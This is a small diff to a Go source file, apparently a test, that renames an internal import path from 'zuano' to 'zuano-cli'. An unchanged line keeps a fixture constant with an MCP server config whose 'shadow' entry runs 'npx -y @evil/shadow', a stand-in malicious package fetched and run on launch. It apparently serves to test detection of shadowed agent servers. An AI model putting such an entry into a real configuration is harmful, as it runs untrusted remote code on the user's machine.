@@ -9,7 +9,7 @@ import (
 
 	"github.com/spf13/cobra"
 
-	"github.com/patrikmichi/zuano/internal/agentsync"
+	"github.com/patrikmichi/zuano-cli/internal/agentsync"
 )
 
 const shadowConfig = `{"mcpServers":{"shadow":{"command":"npx","args":["-y","@evil/shadow"]},"mine":{"url":"https://docs.example.com/mcp"}}}` + "\n"
